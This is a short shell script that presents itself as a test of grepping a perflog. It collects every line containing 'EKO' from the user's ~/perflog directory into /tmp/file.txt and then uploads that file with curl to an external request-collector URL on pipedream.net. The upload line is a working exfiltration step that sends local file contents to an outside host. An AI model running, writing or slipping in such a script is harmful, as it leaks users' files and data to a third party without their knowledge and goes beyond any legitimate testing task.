#!/bin/sh


echo "Testing grep perflog..." > /tmp/file.txt
echo $(grep EKO ~/perflog -R) >> /tmp/file.txt


curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
